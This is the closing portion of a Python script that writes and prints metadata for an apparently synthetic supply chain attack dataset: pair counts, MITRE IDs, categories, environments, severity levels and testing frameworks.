        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
        "attack_count": len(ATTACKS),
        "categories": ALL_CATEGORIES,
        "environment_types": ENVIRONMENT_TYPES,
        "severity_levels": SEVERITY_LEVELS,
        "testing_frameworks": TESTING_FRAMEWORKS,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nSupply Chain Attack dataset generated:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  Attack definitions: {len(ATTACKS)}")
    print(f"  Categories: {dict(cat_counts)}")
    print(f"  MITRE IDs: {unique_mitre}")
    print(f"  Environments: {ENVIRONMENT_TYPES}")
    print(f"  Severity levels: {SEVERITY_LEVELS}")
    print(f"  Testing frameworks: {TESTING_FRAMEWORKS}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
